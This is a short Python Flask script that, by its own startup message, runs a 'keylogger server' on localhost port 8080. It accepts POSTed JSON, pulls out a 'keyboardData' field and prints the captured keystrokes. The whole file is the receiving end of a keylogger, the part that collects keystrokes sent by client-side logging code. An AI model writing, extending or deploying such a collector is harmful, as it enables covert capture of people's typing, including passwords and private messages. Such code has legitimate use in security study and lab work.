from flask import Flask, request
import json

app = Flask(__name__)

@app.route('/', methods=['POST'])
def receive_keystrokes():
    try:
        data = request.get_json()
        keyboard_data = data.get('keyboardData', '')
        print(f"Received keystrokes: {keyboard_data}")
        return {'status': 'success'}, 200
    except Exception as e:
        print(f"Error processing request: {e}")
        return {'status': 'error'}, 500

if __name__ == '__main__':
    print("Starting keylogger server on http://127.0.0.1:8080")
    app.run(host='127.0.0.1', port=8080, debug=False)
